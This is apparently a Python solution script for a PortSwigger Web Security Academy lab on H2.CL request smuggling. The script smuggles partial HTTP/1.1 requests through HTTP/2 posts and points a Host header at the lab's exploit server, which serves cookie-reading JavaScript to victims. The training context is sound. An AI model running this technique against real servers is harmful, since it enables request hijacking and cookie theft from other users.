'''
    Lab: H2.CL request smuggling
    https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling
'''

import httpx

# Check if the server supports HTTP/2
def check_http2_support(url):
    with httpx.Client(http2=True) as client:
        response = client.get(url)
        return response.http_version
    
def send_smuggling_request(url, data):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "0"
        }
    with httpx.Client(http2=True) as client:
        response = client.post(url, headers=headers, data=data)
        return response
    
def attack():
    host = '0a9900db03022ea48049e912005d008c'
    exploit_server = 'exploit-0af1005d034d2ef58061e84b016300d7'
    url = f"https://{host}.web-security-academy.net"

    protocol = check_http2_support(url)

    
    if protocol == "HTTP/2":

        status_code = 500
        data = "SMUGGLED\r\n\r\n"
        
        while status_code != 404:
            response = send_smuggling_request(url, data)
            status_code = response.status_code

        status_code = 500
        # Request to smuggle the start of a request for /resources,
        print("Trying to smuggle a request for /resources...")
        data = f'''GET /resources HTTP/1.1\r\nHost:foo\r\nContent-Length: 5\r\n\r\nx=1'''
        while status_code != 302:
            response = send_smuggling_request(url, data)
            status_code = response.status_code

        print("Go to the exploit server and change the file path to: /resources\nIn the body, enter the payload: alert(document.cookie)\nThen store the exploit.")
        input("Press Enter to continue...")

        # Request to smuggle the Host header to point to the exploit server
        data = f"GET /resources HTTP/1.1\r\nHost:{exploit_server}.exploit-server.net\r\nContent-Length: 5\r\n\r\nx=1"
        response = send_smuggling_request(url, data).text

        print("Trying to smuggle the Host header to point to the exploit server...")
        while True:
            response = send_smuggling_request(url, data).text
            print(response, end="\r")
attack()